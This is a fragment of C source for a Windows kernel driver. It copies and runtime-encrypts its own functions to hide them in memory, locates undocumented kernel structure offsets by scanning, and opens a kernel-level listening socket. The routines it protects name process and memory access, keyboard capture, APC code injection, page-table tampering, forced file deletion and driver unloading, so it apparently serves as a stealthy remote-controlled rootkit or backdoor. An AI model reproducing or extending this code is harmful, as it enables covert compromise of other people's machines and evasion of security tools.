
	if (NowTime.QuadPart - pGData->Time.QuadPart > 10000000) {

		//SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

		fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr.Ptr,
			pGData->nCount, pGData);

		pGData->nCount = 0;

		pGData->Time.QuadPart = NowTime.QuadPart;


		//_CHANGE_FUNCTION_ENTRY(_hEncrypt_DEC, _Kernel_SELFCALL);

		//_CHANGE_FUNCTION_ENTRY(_hEncrypt_DEC_V, _Kernel_SELFCALL);

		//_CHANGE_FUNCTION_ENTRY(SetAddressExecute, _Kernel_SELFCALL);



	}







	pGData->Map_Worker[CurIndex].Worker.List.Blink = 0;

	ExInitializeWorkItemV((&pGData->Map_Worker[CurIndex].Worker), pGData->Map_Worker[CurIndex].PollingWorker, pGData);
	fNtos->ExQueueWorkItem(&pGData->Map_Worker[CurIndex].Worker, RealTimeWorkQueue);


	if (irql != ReadCR8()) { WriteCR8(irql); }
}



//#pragma optimize("", on)

//#pragma optimize("guard", on)






NTSYSAPI PRUNTIME_FUNCTION RtlLookupFunctionEntry(
	DWORD64 ControlPc,
	PDWORD64 ImageBase,
	PUNWIND_HISTORY_TABLE HistoryTable
);


BOOLEAN InitializeFunCODE(CODE_CALL* pCodeC, PRUNTIME_FUNCTION pRunTime,DWORD64 ImageBase) {

	pCodeC->Size = pRunTime->EndAddress - pRunTime->BeginAddress;
	DWORD nSizeNode = pCodeC->Size / 0x20;
	if (pCodeC->Size % 0x20 != 0 ){
		nSizeNode++;
	}
	pCodeC->Ptr = ExAllocatePoolWithTag(NonPagedPool, nSizeNode * 0x20, 'Mem');
	if (pCodeC->Ptr == 0){
		LOG_DEBUG("ExAllocatePoolWithTag Error\n");
		return FALSE;
	}
	pCodeC->MaxSize = nSizeNode * 0x20;
	RtlCopyMemory(pCodeC->Ptr, (PVOID)(ImageBase + pRunTime->BeginAddress), pCodeC->Size);
	
	DWORD _nSizeNode = pCodeC->MaxSize / PAGE_SIZE; 
	if (pCodeC->MaxSize % PAGE_SIZE != 0) _nSizeNode++;
	pCodeC->nPageSize = _nSizeNode * PAGE_SIZE;


	pCodeC->SelfTradition = 0;
	LOG_DEBUG("Code <%p> copycode<%p> %08X\n", (PVOID)(ImageBase + pRunTime->BeginAddress), pCodeC->Ptr, pCodeC->Size);
	return TRUE;
}


BOOLEAN InitializeFunCODE_Encrypt(CODE_CALL* pCodeC, PRUNTIME_FUNCTION pRunTime, DWORD64 ImageBase) {

	pCodeC->Size = pRunTime->EndAddress - pRunTime->BeginAddress;
	DWORD nSizeNode = pCodeC->Size / 0x20;
	if (pCodeC->Size % 0x20 != 0) {
		nSizeNode++;
	}
	pCodeC->Ptr = ExAllocatePoolWithTag(NonPagedPool, nSizeNode * 0x20, 'Mem');
	if (pCodeC->Ptr == 0) {
		LOG_DEBUG("ExAllocatePoolWithTag Error\n");
		return FALSE;
	}
	pCodeC->MaxSize = nSizeNode * 0x20;
	RtlCopyMemory(pCodeC->Ptr, (PVOID)(ImageBase + pRunTime->BeginAddress), pCodeC->Size);
	DWORD _nSizeNode = pCodeC->MaxSize / PAGE_SIZE;
	if (pCodeC->MaxSize % PAGE_SIZE != 0) _nSizeNode++;
	pCodeC->nPageSize = _nSizeNode * PAGE_SIZE;
	LARGE_INTEGER TimesN;
	KeQuerySystemTime(&TimesN);
	pCodeC->Sgin = (DWORD)TimesN.QuadPart;
	_hEncrypt_DEC_V(0,pCodeC->Sgin, pCodeC->Ptr, pCodeC->MaxSize);
	pCodeC->SelfTradition = 0;
	return TRUE;
}



#include <ntimage.h>


DWORD64 GetModNodePtr(uintptr_t ModBase, LPCSTR pstr, DWORD* pSize) {

	const PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)(ModBase);
	const PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PUCHAR)(ModBase)+dos_header->
		e_lfanew);
	const USHORT section_size = pNtHeader->FileHeader.NumberOfSections;
	const PIMAGE_SECTION_HEADER sections_array = (PIMAGE_SECTION_HEADER)((PUCHAR)(pNtHeader)+sizeof(
		IMAGE_NT_HEADERS));

	for (auto i = 0; i < section_size; i++) {
		if (_stricmp((LPCSTR)sections_array[i].Name, pstr) == 0)
		{
			ULONG64 scan_base = (ULONG64)(ModBase)+sections_array[i].VirtualAddress;
			*pSize = sections_array[i].SizeOfRawData;
			return scan_base;
		}
	}
	return 0;
}



PRUNTIME_FUNCTION GetFRuntime(ULONG64 hModBase, DWORD64 ControlPc) {

	DWORD nSize = 0;
	DWORD64 bPtr = GetModNodePtr(hModBase, ".pdata", &nSize);
	//LOG_DEBUG("SelfMod <%p><%08X>\n", bPtr, nSize);
	for (DWORD E = 0; E < nSize; E += 0xC)
	{
		RUNTIME_FUNCTION* pFunctionException = (RUNTIME_FUNCTION*)(bPtr + E);
		DWORD64 BeginAddress = hModBase + pFunctionException->BeginAddress;
		DWORD64 EndAddress = hModBase + pFunctionException->EndAddress;

		if (ControlPc >= BeginAddress && ControlPc <= EndAddress){
			return pFunctionException;
		}
	}
	return 0;
}




//INI_CODE

#define INI_CODE(x,y,z) InitializeFunCODE(x, y, z); \
             LOG_DEBUG(#x " [%08X]\n", (x)->Size);

#define INI_CODE_ENCRYPT(x,y,z) InitializeFunCODE_Encrypt(x, y, z); \
             LOG_DEBUG(#x " [%08X]\n", (x)->Size);


#define FLUSH_FUNCTION(x,y,z,g,h,i) RtlZeroMemory(&h, sizeof(UNWIND_HISTORY_TABLE));\
        y = RtlLookupFunctionEntry((DWORD64)&x, &g, &h);\
        if (y == NULL) {LOG_DEBUG( #x " Error\n");return FALSE;}\
        INI_CODE(&i->x, y, z);

#define FLUSH_FUNCTION_ENCRYPT(x,y,z,g,h,i) RtlZeroMemory(&h, sizeof(UNWIND_HISTORY_TABLE));\
        y = RtlLookupFunctionEntry((DWORD64)&x, &g, &h);\
        if (y == NULL) {LOG_DEBUG( #x " Error\n");}\
        else {INI_CODE_ENCRYPT(&i->x, y, z);}



BOOLEAN Initialize_SelfFunction(SELF_F_ARRY* pSelfFArry, DWORD64 DllBase){


	UNWIND_HISTORY_TABLE Table = { 0 };
	ULONG64 hModBase = DllBase;
	PRUNTIME_FUNCTION pRunTime = 0; 
	
	FLUSH_FUNCTION_ENCRYPT(LoadMemoryToUser, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(FreeMemoryMDL, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(SafeMemory, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(FindProcessID, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(Get_Win32k_Process_Explorer, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(SetAddressExecute, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(_hEncrypt, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(_hEncrypt_DEC, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(_hEncrypt_DEC_V, pRunTime, DllBase, hModBase, Table, pSelfFArry);


	FLUSH_FUNCTION_ENCRYPT(PollingTimer, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(PollingWorker, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(PollingExTimer, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(AcceptFromEx, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(IO_COMPLETION_ROUTINE_Ex, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(SendRecvFromEx, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(FlushWskAccept_SendRecvEx, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	
	FLUSH_FUNCTION_ENCRYPT(hBufferSocket, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(IOSocketBuffer, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(sendEncrypt, pRunTime, DllBase, hModBase, Table, pSelfFArry);


	FLUSH_FUNCTION_ENCRYPT(Brother_Memory, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(Brother_Process, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(Brother_Window, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(Brother_Moudle, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(Brother_KeyBoard, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(Brother_File, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	


	FLUSH_FUNCTION_ENCRYPT(MmGetPhysicalAddressSelf, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	
	FLUSH_FUNCTION_ENCRYPT(MmCopyMemoryV, pRunTime, DllBase, hModBase, Table, pSelfFArry);


	FLUSH_FUNCTION_ENCRYPT(FindWindowW, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(RunApc, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(RunApcNo, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	
	FLUSH_FUNCTION_ENCRYPT(ACCEPT_ROUTINE, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(RECV_SEND_ROUTINE, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	
	FLUSH_FUNCTION_ENCRYPT(RunApcRunCode, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(GetModuleBaseWow64, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	//FindProcessID8
	FLUSH_FUNCTION_ENCRYPT(FindProcessID8, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(FindProcessHandle, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(_WORKER_THREAD_ROUTINE, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(_Work_Memory, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(RunApcSocketBuffer, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	
	FLUSH_FUNCTION_ENCRYPT(RunApcRunCodeDirect, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(SetAddressValidPte, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(ExAllocateFunctionMemory, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	
	FLUSH_FUNCTION_ENCRYPT(ExAllocateFunctionMemoryApc, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	FLUSH_FUNCTION_ENCRYPT(GetProcessEprocess, pRunTime, DllBase, hModBase, Table, pSelfFArry);


	FLUSH_FUNCTION_ENCRYPT(FD_SetFileCompletion, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(FD_OpenFile, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(FD_StripFileAttributes, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(FD_DeleteFile, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(ForceDeleteFile, pRunTime, DllBase, hModBase, Table, pSelfFArry);


	FLUSH_FUNCTION_ENCRYPT(QueryDosDeviceW, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(DeviceDosPathToNtPath, pRunTime, DllBase, hModBase, Table, pSelfFArry);
	FLUSH_FUNCTION_ENCRYPT(UnLoadDriver_Mother, pRunTime, DllBase, hModBase, Table, pSelfFArry);

	return TRUE;
}

void Initialize_UNICODE_STRING(CODE_UNICODE_STRING* pC_USTRING, LPCWSTR str) {

	pC_USTRING->Size = wcslen(str) *2;
	pC_USTRING->MaxSize = pC_USTRING->Size + 2;
	pC_USTRING->Ptr = ExAllocatePoolWithTag(NonPagedPool, pC_USTRING->MaxSize, '-');
	if (pC_USTRING->Ptr){
		RtlCopyMemory(pC_USTRING->Ptr, str, pC_USTRING->MaxSize);
		LOG_DEBUG("%ws\n", (LPCWSTR)pC_USTRING->Ptr);
		LARGE_INTEGER TimesN;
		KeQuerySystemTime(&TimesN);
		pC_USTRING->Sgin = (DWORD)TimesN.QuadPart;
		//_hEncrypt_DEC_V(0, pC_USTRING->Sgin, pC_USTRING->Ptr, (int)pC_USTRING->MaxSize);
	}
}

void Initialize_STRING(CODE_ANSI_STRING* pC_STRING, LPCSTR str) {

	pC_STRING->Size = strlen(str);
	pC_STRING->MaxSize = pC_STRING->Size + 1;
	pC_STRING->Ptr = ExAllocatePoolWithTag(NonPagedPool, pC_STRING->MaxSize, '-');
	if (pC_STRING->Ptr) {
		RtlCopyMemory(pC_STRING->Ptr, str, pC_STRING->MaxSize);
		LOG_DEBUG("%s\n", pC_STRING->Ptr);
		LARGE_INTEGER TimesN;
		KeQuerySystemTime(&TimesN);
		pC_STRING->Sgin = (DWORD)TimesN.QuadPart;
		//_hEncrypt_DEC_V(0, pC_STRING->Sgin, pC_STRING->Ptr, (int)pC_STRING->MaxSize);
	}
}


#define SELF_CODE_STRING(x,y) Initialize_UNICODE_STRING(&pSelfUArry->x,y);

BOOLEAN Initialize_Self_STRING(SELF_UNICODE_STRING_ARRY* pSelfUArry){
	//Initialize_UNICODE_STRING(&pSelfUArry->Explorer, L"Explorer.exe");

	//SELF_CODE_STRING(Explorer, L"csrss.exe");
	SELF_CODE_STRING(Explorer, L"Explorer.exe");
	SELF_CODE_STRING(Map_Timer, L"Map_Timer\n");
	SELF_CODE_STRING(WsWs, L"%s%s");
	SELF_CODE_STRING(ImagePath, L"ImagePath");
	SELF_CODE_STRING(AA, L"\\??");
	
	return TRUE;
}

#define SELF_CODE_ANSI_STRING(x,y) Initialize_STRING(&pSelfAArry->x,y);

BOOLEAN Initialize_Self_ANSI_STRING(SELF_STRING_ARRY* pSelfAArry)
{
	SELF_CODE_ANSI_STRING(Csrss, "Csrss.exe");
	SELF_CODE_ANSI_STRING(Explorer, "Explorer.exe");
	SELF_CODE_ANSI_STRING(Map_Timer, "Map_Timer\n");
	SELF_CODE_ANSI_STRING(Line_Ptr, "[%d] <%p>\n");
	SELF_CODE_ANSI_STRING(Line_Ptr_DWORD, "[%d] <%p> <%08X>\n");
	SELF_CODE_ANSI_STRING(Line_Ptr_WS, "[%d] <%p> <%ws>\n");

	SELF_CODE_ANSI_STRING(Line_Ptr_DWORD_DWORD, "[%d] <%p> <%08X><%08X>\n");

	SELF_CODE_ANSI_STRING(SendLenth, "[%d] send lenth  %d   %d\n");

	SELF_CODE_ANSI_STRING(Line_Ptr_DWORD_DWORD_ExAllocate, "[%d] ExAllocateFunctionMemory Irql too Less  %d   %d\n");
	

#ifdef DEBUG

#endif // DEBUG



	return TRUE;
}

NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);

BOOLEAN IniHandleOffset(Global_Data * pGData) {

	PETHREAD pEthread = PsGetCurrentThread();
	HANDLE dwPID = PsGetCurrentProcessId();
	HANDLE dwTID = PsGetCurrentThreadId();

	for (int i = 0; i < 0x1000; i++)
	{
		CLIENT_ID* pID = (CLIENT_ID*)((ULONGLONG)pEthread + i * 8);
		if (pID->UniqueProcess == dwPID
			&& pID->UniqueThread == dwTID)
		{
			pGData->offsetCLIENT_ID = i * 8;
			pGData->offsetEthread_ThreadList = pGData->offsetCLIENT_ID + 0x70;
			break;
		}
	}
	LOG_DEBUG("offsetCLIENT_ID %08X\n", pGData->offsetCLIENT_ID);

	PEPROCESS peprocess = PsGetCurrentProcess();

	int ih = 0;
	for (int i = 0; i < 0x1000; i++)
	{
		PEPROCESS peprocess_0 = *(PEPROCESS*)((ULONGLONG)pEthread + i * 8);
		if (peprocess_0 == peprocess)
		{
			if (ih == 0)
			{
				ih++;
				pGData->OffsetApcState = i * 8 - 0x20;
			}
			else if (ih == 1)
			{
				pGData->offsetProcess = i * 8;
				break;
			}
		}
	}


	PUCHAR pCharName = PsGetProcessImageFileName(peprocess);


	// WIN7
	// 0x28


	RTL_OSVERSIONINFOEXW OsVersion = { 0 };
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&OsVersion);


	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		pGData->offsetEprocess_ThreadList = (DWORD)((ULONGLONG)pCharName - (ULONGLONG)peprocess + 0x28);
	}
	else
	{
		pGData->offsetEprocess_ThreadList = (DWORD)((ULONGLONG)pCharName - (ULONGLONG)peprocess + 0x38);
	}
	//LOG_DEBUG("OffsetApcState %08X  offsetProcess %08X\n", OffsetApcState, offsetProcess);


	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1) {
		pGData->offsetKprocess_ProcessList = 0xE0;
	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {
		pGData->offsetKprocess_ProcessList = 0x240;
	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		pGData->offsetKprocess_ProcessList = 0x248;
	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
		pGData->offsetKprocess_ProcessList = 0x350;
	}






	//LOG_DEBUG("offsetEthread_ThreadList %08X  offsetEprocess_ThreadList %08X\n",
	//	offsetEthread_ThreadList, offsetEprocess_ThreadList);

	return TRUE;
}



SOCKET create_server_socket(PWSK_SERVER_INFO wsk, uint16_t port)
{
	SOCKADDR_IN address;

	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY/*htonl(server_ip)*/;
	address.sin_port = htons(port);

	SOCKET sockfd = socket_listenV2(&wsk->bWsk, AF_INET, SOCK_STREAM, 0);
	if (sockfd == INVALID_SOCKET)
	{
		//log("Failed to create a valid server socket.\n");

		return INVALID_SOCKET;
	}

	if (bindV2(&wsk->bWsk,sockfd, (SOCKADDR*)&address, sizeof(address)) == SOCKET_ERROR)
	{
		//log("Failed to bind the server socket.\n");

		closesocketV2(&wsk->bWsk,sockfd);
		return INVALID_SOCKET;
	}

	if (listen(sockfd, 10) == SOCKET_ERROR)
	{
		//log("Failed to start listening in on the server socket.\n");
		closesocketV2(&wsk->bWsk,sockfd);
		return INVALID_SOCKET;
	}

	return sockfd;
}


//----------------------------------------------------------//



//WSK_REGISTRATION     WskRegistration;
//WSK_PROVIDER_NPI     WskProvider;
//WSK_CLIENT_DISPATCH  WskDispatch;

NTSTATUS
NTAPI
WskInitialize(
	PWSK_SERVER_INFO wsk
)
{
	NTSTATUS Status = KsInitialize(&wsk->bWsk);

	return Status;
	//wsk->WskDispatch = WskDispatch;

	////
	//// Register as a WSK client.
	////

	//WSK_CLIENT_NPI WskClient;
	//WskClient.ClientContext = NULL;
	//WskClient.Dispatch = &wsk->WskDispatch;

	//Status = WskRegister(&WskClient, &wsk->WskRegistration);

	//if (!NT_SUCCESS(Status))
	//{
	//	return Status;
	//}

	////
	//// Capture the provider NPI.
	////

	//return WskCaptureProviderNPI(
	//	&wsk->WskRegistration,
	//	WSK_INFINITE_WAIT,
	//	&wsk->WskProvider
	//);
}



BOOLEAN KServer_StartSign(PWSK_SERVER_INFO wsk, DWORD RandSign, _hBufferWsk gRun) {

	NTSTATUS status = WskInitialize(wsk);
	if (!NT_SUCCESS(status)) {
		LOG_DEBUG("Failed to initialize KSOCKET.\n");
		return  0;
	}
	int port = RandSign % 30000;
	if (port < 10000) {
		port = port + 10000;
	}
	//wsk->_Server_s = create_server_socket((uint16_t)port);
	//if (server_socket == INVALID_SOCKET)
	//{
	//	log("Failed to initialize the server socket.\n");
	//	KsDestroy();
	//	return 0;
	//}
	//LOG_DEBUG("Listening on port %d\n", port);
	//g_hBuffer = CALL;




	//RtlZeroMemory(BufferArry, sizeof(SOCKET_BUFFER) * 128);
	//HANDLE thread_handle = 0;
	//status = PsCreateSystemThread(&thread_handle, THREAD_ALL_ACCESS, 0, 0, 0, server_accept, NULL);

	//if (NT_SUCCESS(status))
	//{
	//	LOG_DEBUG("Accept Thread <%p>\n", thread_handle);
	//}

	//TIMER_DPC_INFO* pDpcInfo = ExAllocatePoolWithTag(PagedPool, sizeof(TIMER_DPC_INFO), 'Tag');

	//KeInitializeTimer(&pDpcInfo->Timer);

	//pDpcInfo->DeferredRoutine = PollingAcceptTimer;
	//pDpcInfo->sockfd = server_socket;
	//KeInitializeDpc(&pDpcInfo->Dpc, PollingAcceptTimer, pDpcInfo);

	//LARGE_INTEGER DueTime; DueTime.QuadPart = 0;

	//KeSetTimerEx(&pDpcInfo->Timer, DueTime, 10, &pDpcInfo->Dpc);
	return 1;
}


